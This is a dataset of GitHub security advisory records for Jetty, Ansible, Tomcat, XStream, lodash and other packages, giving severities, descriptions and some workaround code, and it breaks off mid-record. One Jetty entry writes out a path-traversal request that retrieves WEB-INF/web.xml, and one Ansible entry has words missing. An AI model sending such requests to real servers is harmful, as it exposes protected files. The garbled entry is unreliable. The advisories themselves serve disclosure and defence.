436,34297,org.eclipse.jetty:jetty-io,GHSA-26vr-8j45-3r4w,CVE-2021-28165,https://github.com/advisories/GHSA-26vr-8j45-3r4w,high,2021-04-06 17:31:30 UTC,"Jetty vulnerable to incorrect handling of invalid large TLS frame, exhausting CPU resources","### Impact
When using SSL/TLS with Jetty, either with HTTP/1.1, HTTP/2, or WebSocket, the server may receive an invalid large (greater than 17408) TLS frame that is incorrectly handled, causing CPU resources to eventually reach 100% usage.

### Workarounds

The problem can be worked around by compiling the following class:
```java
package org.eclipse.jetty.server.ssl.fix6072;

import java.nio.ByteBuffer;
import javax.net.ssl.SSLEngine;
import javax.net.ssl.SSLEngineResult;
import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;

import org.eclipse.jetty.io.EndPoint;
import org.eclipse.jetty.io.ssl.SslConnection;
import org.eclipse.jetty.server.Connector;
import org.eclipse.jetty.server.SslConnectionFactory;
import org.eclipse.jetty.util.BufferUtil;
import org.eclipse.jetty.util.annotation.Name;
import org.eclipse.jetty.util.ssl.SslContextFactory;

public class SpaceCheckingSslConnectionFactory extends SslConnectionFactory
{
    public SpaceCheckingSslConnectionFactory(@Name(""sslContextFactory"") SslContextFactory factory, @Name(""next"") String nextProtocol)
    {
        super(factory, nextProtocol);
    }

    @Override
    protected SslConnection newSslConnection(Connector connector, EndPoint endPoint, SSLEngine engine)
    {
        return new SslConnection(connector.getByteBufferPool(), connector.getExecutor(), endPoint, engine, isDirectBuffersForEncryption(), isDirectBuffersForDecryption())
        {
            @Override
            protected SSLEngineResult unwrap(SSLEngine sslEngine, ByteBuffer input, ByteBuffer output) throws SSLException
            {
                SSLEngineResult results = super.unwrap(sslEngine, input, output);

                if ((results.getStatus() == SSLEngineResult.Status.BUFFER_UNDERFLOW ||
                    results.getStatus() == SSLEngineResult.Status.OK && results.bytesConsumed() == 0 && results.bytesProduced() == 0) &&
                    BufferUtil.space(input) == 0)
                {
                    BufferUtil.clear(input);
                    throw new SSLHandshakeException(""Encrypted buffer max length exceeded"");
                }
                return results;
            }
        };
    }
}
```
This class can be deployed by:
 + The resulting class file should be put into a jar file (eg sslfix6072.jar)
 + The jar file should be made available to the server. For a normal distribution this can be done by putting the file into ${jetty.base}/lib
 + Copy the file `${jetty.home}/modules/ssl.mod` to `${jetty.base}/modules`
 + Edit the `${jetty.base}/modules/ssl.mod` file to have the following section:

```
[lib]
lib/sslfix6072.jar
```

+ Copy the file `${jetty.home}/etc/jetty-https.xml` and`${jetty.home}/etc/jetty-http2.xml` to `${jetty.base}/etc`
+ Edit files `${jetty.base}/etc/jetty-https.xml` and `${jetty.base}/etc/jetty-http2.xml`, changing any reference of `org.eclipse.jetty.server.SslConnectionFactory` to `org.eclipse.jetty.server.ssl.fix6072.SpaceCheckingSslConnectionFactory`. For example:
```xml
  <Call name=""addIfAbsentConnectionFactory"">
    <Arg>
      <New class=""org.eclipse.jetty.server.ssl.fix6072.SpaceCheckingSslConnectionFactory"">
        <Arg name=""next"">http/1.1</Arg>
        <Arg name=""sslContextFactory""><Ref refid=""sslContextFactory""/></Arg>
      </New>
    </Arg>
  </Call>
```
+ Restart Jetty",maven
437,13397,UmbracoCms,GHSA-936x-wgqv-hhgq,CVE-2020-5811,https://github.com/advisories/GHSA-936x-wgqv-hhgq,moderate,2021-04-13 15:51:33 UTC,Authenticated path traversal in Umbraco CMS,"An authenticated path traversal vulnerability exists during package installation in Umbraco CMS <= 8.9.1 or current, which could result in arbitrary files being written outside of the site home and expected paths when installing an Umbraco package.",nuget
438,18865,actionpack,GHSA-35mm-cc6r-8fjp,CVE-2020-8264,https://github.com/advisories/GHSA-35mm-cc6r-8fjp,moderate,2021-04-07 20:58:47 UTC,Cross-site scripting in actionpack,"In actionpack gem >= 6.0.0, a possible XSS vulnerability exists when an application is running in development mode allowing an attacker to send or embed (in another page) a specially crafted URL which can allow the attacker to execute JavaScript in the context of the local application. This vulnerability is in the Actionable Exceptions middleware.",rubygems
439,34496,org.apache.xmlbeans:xmlbeans,GHSA-mw3r-pfmg-xp92,CVE-2021-23926,https://github.com/advisories/GHSA-mw3r-pfmg-xp92,critical,2021-06-16 17:37:11 UTC,Improper Restriction of Recursive Entity References in Apache XMLBeans,The XML parsers used by XMLBeans up to version 2.6.0 did not set the properties needed to protect the user from malicious XML input. Vulnerabilities include possibilities for XML Entity Expansion attacks. Affects XMLBeans up to and including v2.6.0.,maven
440,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-2rvv-w9r2-rg7m,CVE-2021-24122,https://github.com/advisories/GHSA-2rvv-w9r2-rg7m,moderate,2021-05-13 22:30:02 UTC,Information Disclosure in Apache Tomcat,"When serving resources from a network location using the NTFS file system, Apache Tomcat versions 10.0.0-M1 to 10.0.0-M9, 9.0.0.M1 to 9.0.39, 8.5.0 to 8.5.59 and 7.0.0 to 7.0.106 were susceptible to JSP source code disclosure in some configurations. The root cause was the unexpected behaviour of the JRE API File.getCanonicalPath() which in turn was caused by the inconsistent behaviour of the Windows API (FindFirstFileW) in some circumstances.",maven
441,19842,urllib3,GHSA-5phf-pp7p-vc2r,CVE-2021-28363,https://github.com/advisories/GHSA-5phf-pp7p-vc2r,moderate,2021-03-19 19:42:11 UTC,Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection,"### Impact

Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via `proxy_config`.
Only the default SSLContext is impacted.

### Patches

[urllib3 >=1.26.4 has the issue resolved](https://github.com/urllib3/urllib3/releases/tag/1.26.4). urllib3<1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.

### Workarounds

Upgrading is recommended as this is a minor release and not likely to break current usage.

Configuring an `SSLContext` with `check_hostname=True` and passing via `proxy_config` instead of relying on the default `SSLContext`

### For more information
If you have any questions or comments about this advisory:
* Email us at [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com)",pip
442,20092,ansible,GHSA-893h-35v4-mxqx,CVE-2020-1737,https://github.com/advisories/GHSA-893h-35v4-mxqx,moderate,2021-04-20 16:43:33 UTC,Path Traversal in Ansible,"A flaw was found in Ansible 2.7.17 and prior, 2.8.9 and prior, and 2.9.6 and prior when using the Extract-Zip function from the win_unzip module as the extracted file(s) are not checked if they belong to the destination folder. An attacker could take advantage of this flaw by crafting an archive anywhere in the file system, using a path traversal. This issue is fixed in 2.10.",pip
443,20092,ansible,GHSA-g4mq-6fp5-qwcf,CVE-2020-1733,https://github.com/advisories/GHSA-g4mq-6fp5-qwcf,moderate,2021-04-20 16:46:12 UTC,Exposure of Resource to Wrong Sphere and 	Insecure Temporary File in Ansible,"A race condition flaw was found in Ansible Engine 2.7.17 and prior, 2.8.9 and prior, 2.9.6 and prior when running a playbook with an unprivileged become user. When Ansible needs to run a module with become user, the temporary directory is created in /var/tmp. This directory is created with ""umask 77 && mkdir -p <dir>""; this operation does not fail if the directory already exists and is owned by another user. An attacker could take advantage to gain control of the become user as the target directory can be retrieved by iterating '/proc/<pid>/cmdline'.",pip
444,20092,ansible,GHSA-923p-fr2c-g5m2,CVE-2020-1739,https://github.com/advisories/GHSA-923p-fr2c-g5m2,low,2021-04-07 20:30:44 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Ansible,"A flaw was found in Ansible 2.7.16 and prior, 2.8.8 and prior, and 2.9.5 and prior when a password is set with the argument ""password"" of svn module, it is used on svn command line, disclosing to other users within the same node. An attacker could take advantage by reading the cmdline file from that particular PID on the procfs.",pip
445,20092,ansible,GHSA-gfr2-qpxh-qj9m,CVE-2020-1735,https://github.com/advisories/GHSA-gfr2-qpxh-qj9m,moderate,2021-04-07 20:35:24 UTC,Path Traversal in Ansible,"A flaw was found in the Ansible Engine when the fetch module is used. An attacker could intercept the module, inject a new path, and then choose a new destination path on the controller node. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.",pip
446,20092,ansible,GHSA-86hp-cj9j-33vv,CVE-2020-1753,https://github.com/advisories/GHSA-86hp-cj9j-33vv,moderate,2021-04-07 20:33:26 UTC,"Insertion of Sensitive Information into Log File, Invocation of Process Using Visible Sensitive Information, and 	Exposure of Sensitive Information to an Unauthorized Actor in Ansible","A security flaw was found in Ansible Engine, all Ansible 2.7.x versions prior to 2.7.17, all Ansible 2.8.x versions prior to 2.8.11 and all Ansible 2.9.x versions prior to 2.9.7, when managing kubernetes using the k8s module. Sensitive parameters such as passwords and tokens are passed to kubectl from the command line, not using an environment variable or an input configuration file. This will disclose passwords and tokens from process list and no_log directive from debug module would not have any effect making these secrets being disclosed on stdout and log files.",pip
447,12878,Microsoft.AspNetCore.Mvc,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
448,12878,Microsoft.AspNetCore.Mvc,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
449,12878,Microsoft.AspNetCore.Mvc,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
450,20092,ansible,GHSA-p62g-jhg6-v3rq,CVE-2020-10684,https://github.com/advisories/GHSA-p62g-jhg6-v3rq,low,2021-04-07 20:37:06 UTC,"Code Injection, Race Condition, and Execution with Unnecessary Privileges in Ansible","A flaw was found in Ansible Engine, all versions 2.7.x, 2.8.x and 2.9.x prior to 2.7.17, 2.8.9 and 2.9.6 respectively, when using ansible_facts as a subkey of itself and promoting it to a variable when inject is enabled, overwriting the ansible_facts after the clean. An attacker could take advantage of this by altering the ansible_facts, such as ansible_hosts, users and any other key data which would lead into privilege escalation or code injection.",pip
451,20092,ansible,GHSA-frxj-5j27-f8rf,CVE-2019-14905,https://github.com/advisories/GHSA-frxj-5j27-f8rf,moderate,2021-04-20 16:44:49 UTC,"Externally Controlled Reference to a Resource in Another Sphere, Improper Input Validation, and External Control of File Name or Path in Ansible","A vulnerability was found in Ansible Engine versions 2.9.x before 2.9.3, 2.8.x before 2.8.8, 2.7.x before 2.7.16 and earlier, where in Ansible's nxos_file_copy module can be used to copy files to a flash or bootflash on NXOS devices. Malicious code could craft the filename parameter to perform OS command injections. This could result in a loss of confidentiality of the system among other issues.",pip
452,20092,ansible,GHSA-3c67-gc48-983w,CVE-2020-10691,https://github.com/advisories/GHSA-3c67-gc48-983w,moderate,2021-04-20 16:44:37 UTC,Path Traversal in Ansible,"An archive traversal flaw was found in all ansible-engine versions 2.9.x prior to 2.9.7, when running ansible-galaxy collection install. When extracting a collection .tar.gz file, the directory is created without sanitizing the filename. An attacker could take advantage to overwrite any file within the system.",pip
453,20092,ansible,GHSA-77g3-3j5w-64w4,CVE-2020-10685,https://github.com/advisories/GHSA-77g3-3j5w-64w4,low,2021-04-07 20:36:46 UTC,Exposure of Resource to Wrong Sphere and Insecure Temporary File in Ansible,"A flaw was found in Ansible Engine affecting Ansible Engine versions 2.7.x before 2.7.17 and 2.8.x before 2.8.11 and 2.9.x before 2.9.7 as well as Ansible Tower before and including versions 3.4.5 and 3.5.5 and 3.6.3 when using modules which decrypts vault files such as assemble, script, unarchive, win_copy, aws_s3 or copy modules. The temporary directory is created in /tmp leaves the s ts unencrypted. On Operating Systems which /tmp is not a tmpfs but part of the root partition, the directory is only cleared on boot and the decryp emains when the host is switched off. The system will be vulnerable when the system is not running. So decrypted data must be cleared as soon as possible and the data which normally is encrypted ble.",pip
454,20092,ansible,GHSA-gwr8-5j83-483c,CVE-2019-14904,https://github.com/advisories/GHSA-gwr8-5j83-483c,high,2021-04-20 16:44:22 UTC,OS Command Injection and Improper Input Validation in ansible,"A flaw was found in the solaris_zone module from the Ansible Community modules. When setting the name for the zone on the Solaris host, the zone name is checked by listing the process with the 'ps' bare command on the remote machine. An attacker could take advantage of this flaw by crafting the name of the zone and executing arbitrary commands in the remote host. Ansible Engine 2.7.15, 2.8.7, and 2.9.2 as well as previous versions are affected.",pip
455,35117,org.eclipse.jetty:jetty-deploy,GHSA-j6qj-j888-vvgq,CVE-2021-28163,https://github.com/advisories/GHSA-j6qj-j888-vvgq,low,2021-04-06 17:32:00 UTC,Directory exposure in jetty,"### Impact
If the `${jetty.base}` directory or the `${jetty.base}/webapps` directory is a symlink (soft link in Linux), the contents of the `${jetty.base}/webapps` directory may be deployed as a static web application, exposing the content of the directory for download. 

For example, the problem manifests in the following `${jetty.base}`:
```$ tree demo-base/
demo-base/
├── etc
├── lib
├── resources
├── start.d
├── deploy
│   └── async-rest.war
└── webapps -> deploy

``` 

### Workarounds
Do not use a symlink",maven
456,20092,ansible,GHSA-m429-fhmv-c6q2,CVE-2020-14365,https://github.com/advisories/GHSA-m429-fhmv-c6q2,high,2021-04-20 16:44:07 UTC,Improper Verification of Cryptographic Signature,"A flaw was found in the Ansible Engine, in ansible-engine 2.8.x before 2.8.15 and ansible-engine 2.9.x before 2.9.13, when installing packages using the dnf module. GPG signatures are ignored during installation even when disable_gpg_check is set to False, which is the default behavior. This flaw leads to malicious packages being installed on the system and arbitrary code executed via package installation scripts. The highest threat from this vulnerability is to integrity and system availability.",pip
457,20092,ansible,GHSA-j2h6-73x8-22c4,CVE-2020-1746,https://github.com/advisories/GHSA-j2h6-73x8-22c4,moderate,2021-04-20 16:43:53 UTC,Exposure of Sensitive Information to an Unauthorized Actor in ansible,A flaw was found in the Ansible Engine affecting Ansible Engine versions 2.7.x before 2.7.17 and 2.8.x before 2.8.11 and 2.9.x before 2.9.7 as well as Ansible Tower before and including versions 3.4.5 and 3.5.5 and 3.6.3 when the ldap_attr and ldap_entry community modules are used. The issue discloses the LDAP bind password to stdout or a log file if a playbook task is written using the bind_pw in the parameters field. The highest threat from this vulnerability is data confidentiality.,pip
458,33995,org.eclipse.jetty:jetty-webapp,GHSA-v7ff-8wcx-gmc5,CVE-2021-28164,https://github.com/advisories/GHSA-v7ff-8wcx-gmc5,moderate,2021-04-06 17:31:01 UTC,Authorization Before Parsing and Canonicalization in jetty,"Release 9.4.37 introduced a more precise implementation of [RFC3986](https://tools.ietf.org/html/rfc3986#section-3.3) with regards to URI decoding, together with some new compliance modes to optionally allow support of some URI that may have ambiguous interpretation within the Servlet specified API methods behaviours.   The default mode allowed % encoded . characters to be excluded for URI normalisation, which is correct by the RFC, but is not assumed by common Servlet implementations. The default compliance mode allows requests with URIs that contain `%2e` or `%2e%2e` segments to access protected resources within the `WEB-INF` directory.  For example a request to `/context/%2e/WEB-INF/web.xml` can retrieve the `web.xml` file.  This can reveal sensitive information regarding the implementation of a web application. Workarounds found by HttpCompliance mode RFC7230_NO_AMBIGUOUS_URIS can be enabled by updating `start.d/http.ini` to include: jetty.http.compliance=RFC7230_NO_AMBIGUOUS_URIS.",maven
459,20810,apache-airflow,GHSA-ffw3-6mp6-jmvj,CVE-2021-26559,https://github.com/advisories/GHSA-ffw3-6mp6-jmvj,moderate,2021-04-07 21:05:57 UTC,Improper Access Control in Airflow,Improper Access Control on Configurations Endpoint for the Stable API of Apache Airflow allows users with Viewer or User role to get Airflow Configurations including sensitive information even when `[webserver] expose_config` is set to `False` in `airflow.cfg`. This allowed a privilege escalation attack. This issue affects Apache Airflow 2.0.0.,pip
460,29079,django-registration,GHSA-58c7-px5v-82hh,CVE-2021-21416,https://github.com/advisories/GHSA-58c7-px5v-82hh,low,2021-04-06 17:28:59 UTC,Potential sensitive information disclosed in error reports,"django-registration is a user-registration application for Django. 

### Impact

The django-registration package provides tools for implementing user-account registration flows in the Django web framework. In django-registration prior to 3.1.2, the base user-account registration view did not properly apply filters to sensitive data, with the result that sensitive data could be included in error reports rather than removed automatically by Django.

Triggering this requires the following conditions:

* A site is using django-registration < 3.1.2
* The site has detailed error reports (such as Django's [emailed error reports to site staff/developers](https://docs.djangoproject.com/en/3.1/howto/error-reporting/#email-reports)) enabled
* A server-side error (HTTP 5xx) occurs during an attempt by a user to register an account

Under these conditions, recipients of the detailed error report will see all submitted data from the account-registration attempt, which may include the user's proposed credentials (such as a password).

### Patches

As of version 3.1.2, django-registration properly applies Django's `sensitive_post_parameters()` decorator to the base user-registration view, which will cause all data from the HTTP request body to be filtered from detailed error reports in the event of a server-side crash during user account registration.

Note that as applied, this filters *all* HTTP request data from error reports. To selectively allow some fields but not others, see Django's own documentation (in references) and the notes below for how to apply `sensitive_post_parameters()` manually to a particular codebase's `RegistrationView` subclass(es).

### Workarounds

Users who cannot upgrade quickly can apply the `django.views.decorators.debug.sensitive_post_parameters()` decorator to their own registration views. The decorator should be applied on the `dispatch()` method of the appropriate `RegistrationView` class, using Django's `method_decorator()` helper. For example:

```python
from django.utils.decorators import method_decorator
from django.views.decorators.debug import sensitive_post_parameters

from django_registration.views import RegistrationView

class MyRegistrationView(RegistrationView):
    """"""
    A RegistrationView subclass manually protected against sensitive information disclosure
    in error reports.

    """"""
    @method_decorator(sensitive_post_parameters())
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
```

### References

* Django's documentation on [error reporting in production](https://docs.djangoproject.com/en/3.1/howto/error-reporting/)
* [How Django's sensitive-data filters work](https://docs.djangoproject.com/en/3.1/howto/error-reporting/#filtering-error-reports)",pip
461,18808,lodash,GHSA-35jh-r3h4-6jhm,CVE-2021-23337,https://github.com/advisories/GHSA-35jh-r3h4-6jhm,high,2021-05-06 16:05:51 UTC,Command Injection in lodash,`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.,npm
462,34497,io.undertow:undertow-core,GHSA-qjwc-v72v-fq6r,CVE-2021-20220,https://github.com/advisories/GHSA-qjwc-v72v-fq6r,moderate,2021-06-16 17:47:52 UTC,HTTP request smuggling in Undertow,"A flaw was found in Undertow. A regression in the fix for CVE-2020-10687 was found. HTTP request smuggling related to CVE-2017-2666 is possible against HTTP/1.x and HTTP/2 due to permitting invalid characters in an HTTP request. This flaw allows an attacker to poison a web-cache, perform an XSS attack, or obtain sensitive information from request other than their own. The highest threat from this vulnerability is to data confidentiality and integrity.",maven
463,15882,underscore,GHSA-cf4h-3jhx-xvhq,CVE-2021-23358,https://github.com/advisories/GHSA-cf4h-3jhx-xvhq,critical,2021-05-06 16:09:43 UTC,Arbitrary Code Execution in underscore,"The package `underscore` from 1.13.0-0 and before 1.13.0-2, from 1.3.2 and before 1.12.1 are vulnerable to Arbitrary Code Execution via the template function, particularly when a variable property is passed as an argument as it is not sanitized.",npm
464,18054,@ckeditor/ckeditor5-image,GHSA-3rh3-wfr4-76mj,CVE-2021-21391,https://github.com/advisories/GHSA-3rh3-wfr4-76mj,moderate,2021-04-06 17:28:41 UTC,Regular expression Denial of Service in multiple packages,"
### Impact
A regular expression denial of service (ReDoS) vulnerability has been discovered in multiple CKEditor 5 packages. The vulnerability allowed to abuse particular regular expressions, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 packages listed above at version <= 26.0.0.

### Patches
The problem has been recognized and patched. The fix will be available in version 27.0.0.

### For more information
Email us at security@cksource.com if you have any questions or comments about this advisory.

### Acknowledgements
The CKEditor 5 team would like to thank Yeting Li for recognizing and reporting these vulnerabilities.",npm
465,17508,sanitize-html,GHSA-rjqq-98f6-6j3r,CVE-2021-26539,https://github.com/advisories/GHSA-rjqq-98f6-6j3r,moderate,2021-05-06 16:10:05 UTC,Improper Input Validation in sanitize-html,"Apostrophe Technologies sanitize-html before 2.3.1 does not properly handle internationalized domain name (IDN) which could allow an attacker to bypass hostname whitelist validation set by the ""allowedIframeHostnames"" option.",npm
466,17508,sanitize-html,GHSA-mjxr-4v3x-q3m4,CVE-2021-26540,https://github.com/advisories/GHSA-mjxr-4v3x-q3m4,moderate,2021-05-06 16:10:19 UTC,Improper Input Validation in sanitize-html,"Apostrophe Technologies sanitize-html before 2.3.2 does not properly validate the hostnames set by the ""allowedIframeHostnames"" option when the ""allowIframeRelativeUrls"" is set to true, which allows attackers to bypass hostname whitelist for iframe element, related using an src value that starts with ""/\\example.com"".",npm
467,27139,tweetstream,GHSA-6hrm-jqp3-64cv,CVE-2020-24393,https://github.com/advisories/GHSA-6hrm-jqp3-64cv,moderate,2021-04-13 15:42:36 UTC,Improper Certificate Validation in TweetStream,TweetStream 2.6.1 uses the library eventmachine in an insecure way that does not have TLS hostname validation. This allows an attacker to perform a man-in-the-middle attack.,rubygems
468,20341,webargs,GHSA-fjq3-5pxw-4wj4,CVE-2020-7965,https://github.com/advisories/GHSA-fjq3-5pxw-4wj4,moderate,2021-04-07 21:06:30 UTC,Cross-Site Request Forgery in Webargs,"flaskparser.py in Webargs 5.x through 5.5.2 doesn't check that the Content-Type header is application/json when receiving JSON input. If the request body is valid JSON, it will accept it even if the content type is application/x-www-form-urlencoded. This allows for JSON POST requests to be made across domains, leading to CSRF.",pip
469,19844,Pillow,GHSA-57h3-9rgr-c24m,CVE-2021-25289,https://github.com/advisories/GHSA-57h3-9rgr-c24m,high,2021-03-29 16:35:16 UTC,Out of bounds write in Pillow,An issue was discovered in Pillow before 8.1.1. TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode. NOTE: this issue exists because of an incomplete fix for CVE-2020-35654.,pip
470,19829,PyYAML,GHSA-8q59-q68h-6hv4,CVE-2020-14343,https://github.com/advisories/GHSA-8q59-q68h-6hv4,critical,2021-03-25 21:26:26 UTC,Improper Input Validation in PyYAML,"A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",pip
471,33872,com.google.guava:guava,GHSA-5mg8-w23w-74h3,CVE-2020-8908,https://github.com/advisories/GHSA-5mg8-w23w-74h3,low,2021-03-25 17:04:19 UTC,Information Disclosure in Guava,"A temp directory creation vulnerability exists in all Guava versions allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava `com.google.common.io.Files.createTempDir()`. The permissions granted to the directory created default to the standard unix-like /tmp ones, leaving the files open. We recommend explicitly changing the permissions after the creation of the directory, or removing uses of the vulnerable method
",maven
472,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-j39c-c8hj-x4j3,CVE-2021-25122,https://github.com/advisories/GHSA-j39c-c8hj-x4j3,high,2021-06-16 17:45:29 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Tomcat,"When responding to new h2c connection requests, Apache Tomcat versions 10.0.0-M1 to 10.0.0, 9.0.0.M1 to 9.0.41 and 8.5.0 to 8.5.61 could duplicate request headers and a limited amount of request body from one request to another meaning user A and user B could both see the results of user A's request.",maven
473,20021,rsa,GHSA-537h-rv9q-vvph,CVE-2020-13757,https://github.com/advisories/GHSA-537h-rv9q-vvph,high,2021-03-24 18:24:39 UTC,Access Restriction Bypass,"Python-RSA 4.0 ignores leading '\0' bytes during decryption of ciphertext. This could conceivably have a security-relevant impact, e.g., by helping an attacker to infer that an application uses Python-RSA, or if the length of accepted ciphertext affects application behavior (such as by causing excessive memory allocation).",pip
474,34016,com.thoughtworks.xstream:xstream,GHSA-hrcp-8f3q-4w2c,CVE-2021-21351,https://github.com/advisories/GHSA-hrcp-8f3q-4w2c,moderate,2021-03-22 23:29:37 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21351](https://x-stream.github.io/CVE-2021-21351.html).

### Credits
wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
475,34016,com.thoughtworks.xstream:xstream,GHSA-43gc-mjxg-gvrq,CVE-2021-21350,https://github.com/advisories/GHSA-43gc-mjxg-gvrq,moderate,2021-03-22 23:29:28 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21350](https://x-stream.github.io/CVE-2021-21350.html).

### Credits
The vulnerability was discovered and reported by threedr3am.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
476,34016,com.thoughtworks.xstream:xstream,GHSA-f6hm-88x3-mfjv,CVE-2021-21349,https://github.com/advisories/GHSA-f6hm-88x3-mfjv,moderate,2021-03-22 23:29:19 UTC,A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host,"### Impact
The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21349](https://x-stream.github.io/CVE-2021-21349.html).

### Credits
The vulnerability was discovered and reported by threedr3am.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
477,34016,com.thoughtworks.xstream:xstream,GHSA-56p8-3fh9-4cvq,CVE-2021-21348,https://github.com/advisories/GHSA-56p8-3fh9-4cvq,moderate,2021-03-22 23:29:09 UTC,XStream is vulnerable to an attack using Regular Expression for a Denial of Service (ReDos),"### Impact
The vulnerability may allow a remote attacker to occupy a thread that consumes maximum CPU time and will never return. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21348](https://x-stream.github.io/CVE-2021-21348.html).

### Credits
The vulnerability was discovered and reported by threedr3am.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
478,34016,com.thoughtworks.xstream:xstream,GHSA-qpfq-ph7r-qv6f,CVE-2021-21347,https://github.com/advisories/GHSA-qpfq-ph7r-qv6f,moderate,2021-03-22 23:29:00 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-21347](https://x-stream.github.io/CVE-2021-21347.html).

### Credits
The vulnerability was discovered and reported by threedr3am.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
479,34016,com.thoughtworks.xstream:xstream,GHSA-4hrm-m67v-5cxr,CVE-2021-21346,https://github.com/advisories/GHSA-4hrm-m67v-5cxr,moderate,2021-03-22 23:28:49 UTC,XStream is vulnerable to an Arbitrary Code Execution attack,"### Impact
The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.16.

### Workarounds
